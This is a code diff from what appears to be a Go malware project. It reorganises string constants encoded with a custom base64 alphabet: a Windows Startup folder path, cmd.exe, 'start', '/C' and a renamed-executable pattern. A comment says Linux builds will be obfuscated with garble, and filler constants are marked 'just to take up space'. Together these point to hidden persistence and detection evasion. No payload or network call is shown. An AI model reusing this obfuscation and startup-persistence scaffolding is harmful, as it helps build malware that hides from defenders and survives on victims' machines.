@@ -6,14 +6,20 @@ import (
 )
 
 const (
-	base64Chars                    = "rJw24X3UecVPWtu9+QhILpkMfv8G/DNE1baRdSTZqoH0CFm5ynxgAsB76zYlOijK"
-	STARTUP_FOLDER_FORMATTER       = "cs66WQ/JXb/6+Q/6cQ+LerL+JI1BwyLc2+q2uwdtJnfPXyCw421g2+qrwnWMu2/+JQf+QwdJwb46tJfPrnfXwQ/6tnrXXbrQXr=="
-	DEBUG_STARTUP_FOLDER_FORMATTER = "cs66WQ/JXb/6+Q/6erCIw11PJ+rMuwe0Pxf0VhflWwdA"
-	FOK                            = "r1C9"
-	CMD_EXE                        = "Jydrh14/r+=="
-	START                          = "XnrXXbr="
-	_C                             = "hx/="
-	NEW_NAME_FORMATTER             = "+QDV++JVrQyJ"
+	base64Chars = "rJw24X3UecVPWtu9+QhILpkMfv8G/DNE1baRdSTZqoH0CFm5ynxgAsB76zYlOijK"
+
+	// Windows constants
+	WIN_STARTUP_FOLDER_FORMATTER       = "cs66WQ/JXb/6+Q/6cQ+LerL+JI1BwyLc2+q2uwdtJnfPXyCw421g2+qrwnWMu2/+JQf+QwdJwb46tJfPrnfXwQ/6tnrXXbrQXr=="
+	WIN_DEBUG_STARTUP_FOLDER_FORMATTER = "cs66WQ/JXb/6+Q/6erCIw11PJ+rMuwe0Pxf0VhflWwdA"
+	CMD_EXE                            = "Jydrh14/r+==" // cmd.exe
+	START                              = "XnrXXbr="     // start
+	_C                                 = "hx/="         // /C
+
+	// Linux doesn't need obfuscated strings (It will be handled by garble)
+
+	// Generic
+	FOK                = "r1C9"         // fok
+	NEW_NAME_FORMATTER = "+QDV++JVrQyJ" // %s.%d.exe
 
 	// Just to take up space
 	BLANK  = "Hello, World!"
